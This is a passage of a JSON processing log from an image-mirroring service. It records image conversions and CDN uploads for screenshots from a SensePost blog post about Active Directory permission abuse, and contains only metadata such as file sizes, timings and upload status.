02:21:18","host":"us-014*","referer":"https://sensepost.com/blog/2020/ace-to-rce/","linkMd5ListStr":"09da07a4325c4d20cb042a384b920fa8","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.5 KB","destSize":"21.7 KB","compressRate":"100.9%"},{"code":1,"isDone":false,"source":"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_gui_acl.png","sourceStatusCode":200,"destWidth":858,"destHeight":659,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn17@2020_5/2020/09/20/18-21-18-750_bfd648a53d1c4157.webp","sourceBytes":91077,"destBytes":54732,"targetWebpQuality":75,"feedId":16379,"totalSpendMs":1393,"convertSpendMs":32,"createdTime":"2020-09-21 02:21:18","host":"europe64*","referer":"https://sensepost.com/blog/2020/ace-to-rce/","linkMd5ListStr":"09da07a4325c4d20cb042a384b920fa8","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88.9 KB","destSize":"53.4 KB","compressRate":"60.1%"},{"code":1,"isDone":false,"source":"https://sensepost.com/img/pages/blog/2020/ace-to-rce/powerview_edit.png","sourceStatusCode":200,"destWidth":716,"destHeight":257,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn97@2020_5/2020/09/20/18-21-18-921_5684651d2f6830a7.webp","sourceBytes":5906,"destBytes":15412,"targetWebpQuality":75,"feedId":16379,"totalSpendMs":1397,"convertSpendMs":9,"createdTime":"2020-09-21 02:21:18","host":"europe-60*","referer":"https://sensepost.com/blog/2020/ace-to-rce/","linkMd5ListStr":"09da07a4325c4d20cb042a384b920fa8","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.8 KB","destSize":"15.1 KB","compressRate":"261%"},{"code":1,"isDone":false,"source":"https://sensepost.com/img/pages/blog/2020/ace-to-rce/rsat_gui_edit.gif","sourceStatusCode":200,"destWidth":871,"destHeight":603,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn54@2020_4/2020/09/20/18-21-23-875_d4951abafda1c53e.webp","sourceBytes":560439,"destBytes":205608,"targetWebpQuality":75,"feedId":16379,"totalSpendMs":7054,"convertSpendMs":4928,"createdTime":"2020-09-21 02:21:18","host":"europe64*","referer":"https://sensepost.com/blog/2020/ace-to-rce/","linkMd5ListStr":"09da07a4325c4d20cb042a384b920fa8","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"547.3 KB","destSize":"200.8 KB","compressRate":"36.7%"},{"code":1,"isDone":false,"source":"https://sensepost.com/img/pages/blog/2020/ace-to-rce/genericwrite_edit_with_adsi.gif","sourceStatusCode":200,"destWidth":981,"destHeight":508,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn14@2020_6/2020/09/20/18-21-32-292_198fe9333f09445a.webp","sourceBytes":671198,"destBytes":303500,"targetWebpQuality":75,"feedId":16379,"totalSpendMs":15025,"convertSpendMs":13193,"createdTime":"2020-09-21 02:21:18","host":"us-001*","referer":"https://sensepost.com/blog/2020/ace-to-rce/","linkMd5ListStr":"09da07a4325c4d20cb042a384b920fa8","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"655.5 KB","destSize":"296.4 KB","compressRate":"45.2%"}],"successGithubMap":{"myreaderx25":1,"myreaderx15":1,"myreaderx16":1,"myreaderx27":1,"myreaderx4":1,"myreaderx32":1,"myreaderx21":1,"myreaderx3":1,"myreaderx22":1,"myreaderx33":1,"myreaderx1":1,"myreaderx13":1,"myreaderx24":1,"myreaderx30":1,"myreaderx29":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}}